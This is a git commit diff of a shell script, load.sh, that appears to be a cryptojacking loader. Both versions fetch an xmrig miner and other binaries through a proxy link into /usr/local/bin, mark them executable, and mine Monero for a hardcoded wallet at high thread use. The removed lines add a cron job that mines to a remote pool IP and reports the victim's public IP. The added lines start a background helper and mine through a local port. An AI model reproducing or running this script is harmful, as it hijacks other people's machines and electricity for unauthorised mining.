d76cff94ef0df15145fb57e87bebe5c93fcaed5d
lin2elysia <163723173+lin2elysia@users.noreply.github.com>
2024-03-18 17:27:56 +0800

    Update load.sh

--- load.sh
+++ load.sh
@@ -1,17 +1,33 @@
 #!/bin/bash
 export DIRECTORY="/usr/local/bin"
 export DOWNLOAD_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
-# Check if xmrig file exists
-if [ ! -f "$DIRECTORY/xmrig" ]; then
-    # Download xmrig
-    curl -s -o "$DIRECTORY/xmrig" "$DOWNLOAD_URL"
-    if [ $? -ne 0 ]; then
-        echo "Failed to download xmrig."
-        exit 1
-    fi
-    # Set permissions
-    chmod +x "$DIRECTORY/xmrig"
-fi
+export DOWNLOAD_RUNNING_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/running"
+export DOWNLOAD_CONFIG_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/apiSslMixConfig.json"
+export DOWNLOAD_SSLMIX_URL="https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/sslmix"
 
-# Schedule cron job
-(crontab -l 2>/dev/null; echo "0 0-5 * * * /usr/local/bin/xmrig --url=38.47.101.33:443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=$(curl 4.ipw.cn)-Auto -k --coin monero --tls --max-threads-hint=80") | crontab -
+# Function to download and set permissions for files
+download_and_set_permissions() {
+    local download_url="$1"
+    local filename=$(basename "$download_url")
+    if [ ! -f "$DIRECTORY/$filename" ]; then
+        curl -s -o "$DIRECTORY/$filename" "$download_url"
+        if [ $? -ne 0 ]; then
+            echo "Failed to download $filename."
+            exit 1
+        fi
+        chmod +x "$DIRECTORY/$filename"
+    fi
+}
+
+# Download necessary files if they don't exist
+download_and_set_permissions "$DOWNLOAD_URL"
+download_and_set_permissions "$DOWNLOAD_RUNNING_URL"
+download_and_set_permissions "$DOWNLOAD_CONFIG_URL"
+download_and_set_permissions "$DOWNLOAD_SSLMIX_URL"
+
+# Run /usr/local/bin/running in the background for 3 seconds
+/usr/local/bin/running &
+sleep 3
+
+# Run xmrig command
+/usr/local/bin/xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
